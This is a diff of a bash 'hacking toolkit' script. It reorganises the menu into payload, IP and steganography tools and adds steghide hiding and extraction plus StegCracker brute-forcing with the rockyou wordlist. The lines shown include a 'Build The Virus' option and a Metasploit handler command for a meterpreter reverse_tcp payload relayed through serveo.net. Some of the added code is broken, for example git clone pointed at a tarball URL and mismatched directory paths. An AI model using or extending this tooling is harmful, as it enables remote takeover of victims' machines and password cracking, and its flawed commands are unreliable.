@@ -25,7 +25,7 @@ ACTUAL="THERE WE ARE"
 read pass
 if [ "$pass" != "$ACTUAL" ]
  then 
- echo "Sorry!! Please check the password again or else contact me on pOiSoN0000123@protonmail.com"
+ echo "Sorry!! Please check the password again or else contact me on miteshw05@gmail.com"
  exit 
  else
  echo "Amazing, Password is correct!!!!"
@@ -37,7 +37,7 @@ sleep 2
 then
 echo "ngrok installed OK!!!(JUST CLOSE THE NEWLY OPENED TERMINAL)"
 else
-echo "ngrok is not installed , (This Will not affect the script now , but the upcoming feature (port forwarding using ngrok) will not work)(JUST CLOSE THE NEWLY OPENED TERMINAL)"
+echo "ngrok is not installed"
 fi
 echo -n -e "\r${clr2eol}//////////*********STARTING***********///////// "
 sleep 1
@@ -56,7 +56,12 @@ sleep 1
 echo -n -e "\r${clr2eol}***************************************************************************************************************************** \n"
 sleep 1
 while true; do
-  echo -e "\n\t\t\t1.Build The Virus!!!\n\t\t\t2.Start Port Forwarding\n\t\t\t3.Start Listening\n\t\t\t4.IP Tools"
+  echo -e "\n\t\t\t1.Payload Tools\t\t\t2.IP Tools\t\t\t3.Steganography Tools"
+ read m
+ case $m in
+	[1]* )
+while true; do
+  echo -e "\n\t\t\t1.Build The Virus!!!\n\t\t\t2.Start Port Forwarding\n\t\t\t3.Start Listening\n"
  read s
  case $s in 
 	[1]* )
@@ -127,7 +132,10 @@ done; break;;
 	echo "Select the operating system(windows/android)"
 	read o 
 	msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"; break;;
-	[4]* )
+ 	* ) echo "Please Select Correct option"; break;;
+    esac
+	done; break;;
+	[2]* )
 	clear
 	while true; do
   echo -e "\n\t\t 1.What's My IP\n\t\t2.Hide My IP\n\t\t3.UnHide My  IP"
@@ -181,6 +189,79 @@ done; break;;
 	* ) echo "Please Select Correct option"; break;;
     esac
 done; break;;
+	[3]* )
+	clear
+	while true; do
+  echo -e "\n\t\t\t1.Hide Image\t\t\t2.Unhide Image"
+read z
+ case $z in 
+	[1]* )
+	echo "Checking for programs installed...."
+	sleep 2
+	dpkg -l 'steghide'
+	if [ $? -eq 0 ];
+	then
+	sleep 3
+	echo "Yepp!! Steghide is already installed"
+	else
+	sleep 3
+	echo "No worries Installing it for you...."
+	sleep 3
+	apt-get install steghide
+fi 
+	sleep 3
+	echo "Copy the files in the poison directory"
+	sleep 5
+	echo "Enter the name of your file with extension (eg.lol.jpg) you wanna hide details in"
+	read cover_file
+	sleep 1
+	echo "Enter the name of your secret file"
+	read secret_file
+	sleep 2
+	steghide embed -cf $cover_file -ef $secret_file
+	sleep 3
+	echo "Congrats your stego file is saved on the disk" ; break;;
+	[2]* )
+	while true; do
+	read -p "Do you Have Password for the file??(y/n)" lf
+case $lf in
+        [Yy]* )
+		echo "That's good"
+	sleep 2
+	echo "Please!! Copy The File To Poison Directory"
+	sleep 5
+	echo "Enter the File Name"
+	read file
+	steghide extract -sf $file
+	sleep 3
+	echo "Congrats!! File has been extracted" ; break;;
+	[Nn]* )
+	echo "Checking For The Program"
+	if [ -d "steg-unhide" ] 
+	then
+	echo "Program is already installed"
+	else
+	echo "Installing Program for you"
+	mkdir steg-unhide
+	wget https://raw.githubusercontent.com/Paradoxis/StegCracker/master/stegcracker
+	chmod +x stegcracker
+	mv stegcracker /steg-unhide
+	fi
+	cd steg-unhide
+	echo "Enter the file name"
+	read unhide
+	mv /root/poison/$unhide /root/poison/steg-unhide
+	git clone https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+	tar -xzvf rockyou.txt.tar.gz
+	stegcracker $unhide rockyou.txt
+	sleep 2 ; break;;
+	* ) echo "Please Select correct value" ; break;;
+esac
+
+done; break;;
+	* ) echo "Select Proper Value"; break;;
 esac 
+done; break;;
+esac
 done 
 
